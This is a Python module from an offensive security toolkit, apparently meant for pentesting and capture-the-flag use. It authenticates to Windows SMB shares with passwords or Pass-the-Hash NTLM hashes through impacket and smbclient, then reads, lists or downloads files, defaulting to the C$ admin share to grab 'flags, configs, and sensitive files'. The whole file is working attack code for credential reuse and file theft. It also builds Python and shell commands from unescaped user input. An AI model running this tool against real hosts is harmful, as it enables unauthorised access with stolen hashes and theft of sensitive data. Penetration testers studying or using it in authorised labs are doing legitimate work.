"""
SMB File Read Module
Read files from SMB shares using credentials or Pass-the-Hash
"""

from core.module_base import ModuleBase, ModuleType, Platform


class SMBRead(ModuleBase):
    """
    SMB file reading module.
    Reads files from SMB shares using password or NTLM hash authentication.
    Useful for grabbing flags, configs, and sensitive files.
    """

    def __init__(self):
        super().__init__()
        self.name = "smb_read"
        self.description = "Read files from SMB shares (supports Pass-the-Hash)"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["smb", "file", "read", "pth", "flags", "loot"]
        self.references = [
            "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
        ]

        # Core options
        self.register_option("RHOSTS", "Target host IP", required=True)
        self.register_option("DOMAIN", "Domain name", default="")
        self.register_option("USER", "Username", required=True)
        self.register_option("PASS", "Password or NTLM hash", required=True)

        # Authentication type
        self.register_option("AUTH_TYPE", "Authentication type",
                           default="password", choices=["password", "hash"])

        # File options
        self.register_option("SHARE", "SMB share name (default: C$)", default="C$")
        self.register_option("FILE", "File path on share (e.g., Users\\Administrator\\Desktop\\flag.txt)", required=True)

        # Action
        self.register_option("ACTION", "Action to perform",
                           default="read", choices=["read", "list", "download"])
        self.register_option("OUTPUT", "Local output file for download", default="")

        # Container
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

    def run(self) -> bool:
        target = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN") or ""
        user = self.get_option("USER")
        password = self.get_option("PASS")
        auth_type = self.get_option("AUTH_TYPE")
        share = self.get_option("SHARE")
        file_path = self.get_option("FILE")
        action = self.get_option("ACTION")
        output = self.get_option("OUTPUT")

        self.print_status(f"Target: {target}")
        self.print_status(f"User: {domain}\\{user}" if domain else f"User: {user}")
        self.print_status(f"Auth Type: {auth_type}")
        self.print_status(f"Share: {share}")
        self.print_status(f"File: {file_path}")
        self.print_status(f"Action: {action}")
        self.print_line()

        if action == "read":
            return self._read_file(target, domain, user, password, auth_type, share, file_path)
        elif action == "list":
            return self._list_files(target, domain, user, password, auth_type, share, file_path)
        elif action == "download":
            return self._download_file(target, domain, user, password, auth_type, share, file_path, output)

        return False

    def _read_file(self, target: str, domain: str, user: str, password: str,
                   auth_type: str, share: str, file_path: str) -> bool:
        """Read file contents via SMB"""
        self.print_status("Reading file via SMB...")

        # Build Python script for impacket SMB
        if auth_type == "hash":
            auth_code = f"c.login('{user}', '', '{domain}', nthash='{password}')"
        else:
            auth_code = f"c.login('{user}', '{password}', '{domain}')"

        # Escape backslashes for Python
        escaped_path = file_path.replace('\\', '\\\\')

        script = f'''
import io
from impacket.smbconnection import SMBConnection

try:
    c = SMBConnection('{target}', '{target}')
    {auth_code}
    print('[+] SMB Login successful')

    buf = io.BytesIO()
    c.getFile('{share}', '{escaped_path}', buf.write)
    content = buf.getvalue()

    # Try different encodings
    for enc in ['utf-16', 'utf-16-le', 'utf-8', 'latin-1']:
        try:
            decoded = content.decode(enc).strip()
            print('[+] File contents:')
            print(decoded)
            break
        except:
            continue
    else:
        print('[*] Raw bytes:', content[:200])

except Exception as e:
    print('[-] Error:', str(e))
'''

        # Run via Python in Exegol
        cmd = f"python3 -c \"{script}\""
        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        if "[+] File contents:" in output or "[+] SMB Login successful" in output:
            self.print_line()
            for line in output.split('\n'):
                if line.strip():
                    if line.startswith('[+]'):
                        self.print_good(line[4:])
                    elif line.startswith('[-]'):
                        self.print_error(line[4:])
                    elif line.startswith('[*]'):
                        self.print_status(line[4:])
                    else:
                        self.print_line(f"  {line}")
            return True
        else:
            self.print_error("Failed to read file")
            self.print_error(output)
            return False

    def _list_files(self, target: str, domain: str, user: str, password: str,
                    auth_type: str, share: str, file_path: str) -> bool:
        """List files in directory via SMB"""
        self.print_status("Listing directory via SMB...")

        if auth_type == "hash":
            auth_code = f"c.login('{user}', '', '{domain}', nthash='{password}')"
        else:
            auth_code = f"c.login('{user}', '{password}', '{domain}')"

        escaped_path = file_path.replace('\\', '\\\\')
        if not escaped_path.endswith('*'):
            escaped_path = escaped_path.rstrip('\\\\') + '\\\\*'

        script = f'''
from impacket.smbconnection import SMBConnection

try:
    c = SMBConnection('{target}', '{target}')
    {auth_code}
    print('[+] SMB Login successful')

    files = c.listPath('{share}', '{escaped_path}')
    print('[+] Directory listing:')
    for f in files:
        name = f.get_longname()
        if name not in ['.', '..']:
            ftype = '<DIR>' if f.is_directory() else f'     '
            print(f'  {{ftype}} {{name}}')

except Exception as e:
    print('[-] Error:', str(e))
'''

        cmd = f"python3 -c \"{script}\""
        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        self.print_line()
        for line in output.split('\n'):
            if line.strip():
                if line.startswith('[+]'):
                    self.print_good(line[4:])
                elif line.startswith('[-]'):
                    self.print_error(line[4:])
                else:
                    self.print_line(line)

        return "[+] Directory listing:" in output

    def _download_file(self, target: str, domain: str, user: str, password: str,
                       auth_type: str, share: str, file_path: str, output_file: str) -> bool:
        """Download file via SMB"""
        if not output_file:
            output_file = file_path.split('\\')[-1]

        self.print_status(f"Downloading file to: {output_file}")

        # Use smbclient for download
        if auth_type == "hash":
            # smbclient with hash requires specific format
            cmd = f"smbclient //{target}/{share} -U '{domain}\\{user}%' --pw-nt-hash -c 'get \"{file_path}\" \"{output_file}\"'"
            # This is tricky with smbclient, fall back to impacket
            self.print_warning("Hash-based download using impacket...")
            return self._read_file(target, domain, user, password, auth_type, share, file_path)
        else:
            creds = f"{domain}\\{user}%{password}" if domain else f"{user}%{password}"
            cmd = f"smbclient //{target}/{share} -U '{creds}' -c 'get \"{file_path}\" \"{output_file}\"'"

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)

        if ret == 0:
            self.print_good(f"File downloaded to: {output_file}")
            return True
        else:
            self.print_error(f"Download failed: {stderr}")
            return False

    def check(self) -> bool:
        """Check if impacket is available"""
        ret, stdout, stderr = self.run_in_exegol("python3 -c 'from impacket.smbconnection import SMBConnection; print(\"OK\")'", timeout=15)
        return "OK" in stdout
